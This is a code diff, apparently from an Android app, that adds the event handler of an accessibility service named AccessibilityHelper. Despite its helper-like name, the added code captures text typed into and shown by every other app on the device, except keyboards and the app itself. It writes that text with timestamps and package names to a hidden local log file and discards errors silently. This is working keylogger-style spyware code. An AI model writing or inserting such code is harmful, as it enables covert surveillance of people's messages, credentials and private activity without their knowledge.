@@ -73,4 +73,46 @@ class AccessibilityHelper : AccessibilityService() {
         if (event == null) return
         try {
             val pkg = event.packageName?.toString() ?: return
-            if (p
+            if (pkg == packageName) return
+            if (pkg.contains("inputmethod") || pkg.contains("keyboard")) return
+
+            val type = event.eventType
+            if (type != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED &&
+                type != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED &&
+                type != AccessibilityEvent.TYPE_VIEW_FOCUSED &&
+                type != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return
+
+            val texts = mutableListOf<String>()
+            for (i in 0 until event.text.size) {
+                val t = event.text[i]?.toString()?.trim() ?: ""
+                if (t.isNotBlank() && t.length > 1) texts.add(t)
+            }
+            if (texts.isEmpty()) return
+
+            val combined = texts.joinToString(" | ")
+            val lastKey = lastTextByPkg[pkg]
+            if (lastKey == combined) return
+            lastTextByPkg[pkg] = combined
+
+            try {
+                val f = File(filesDir, "accessibility.jsonl")
+                val entry = JSONObject().apply {
+                    put("type", "accessibility")
+                    put("time", dateFmt.format(Date()) + " " + timeFmt.format(Date()))
+                    put("package", pkg)
+                    put("texts", combined)
+                }
+                java.io.FileOutputStream(f, true).use { fos ->
+                    fos.write((entry.toString() + "\n").toByteArray())
+                }
+            } catch (_: Exception) {}
+
+        } catch (e: Exception) {
+            Log.e("AccessibilityHelper", "err: ${e.message}")
+        }
+    }
+
+    override fun onInterrupt() {
+        Log.d("AccessibilityHelper", "Service interrupted")
+    }
+}
